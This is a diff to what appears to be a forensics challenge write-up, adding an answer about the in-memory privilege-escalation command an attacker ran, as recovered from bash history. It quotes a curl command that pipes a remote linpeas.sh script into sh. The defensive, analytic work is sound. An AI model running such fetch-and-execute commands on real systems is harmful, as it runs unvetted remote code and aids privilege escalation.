@@ -72,10 +72,20 @@ To get this one i just subtracted the line number where the connections end minu
 
 Since this is once the attacker gained access, we need to check the "auth" file to see the time when the attacker got a successful login.
 
+![](../../Img/Pasted%20image%2020260305222527.png)
+
+---
 
 ### Q7: Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.
 
-#### A: 
+#### A: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+Now we need to do a search for "bash" and open the "bash_history" file and check.
+
+![](../../Img/Pasted%20image%2020260305222750.png)
+
+---
+
 ### Q8: The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?
 
 #### A: 
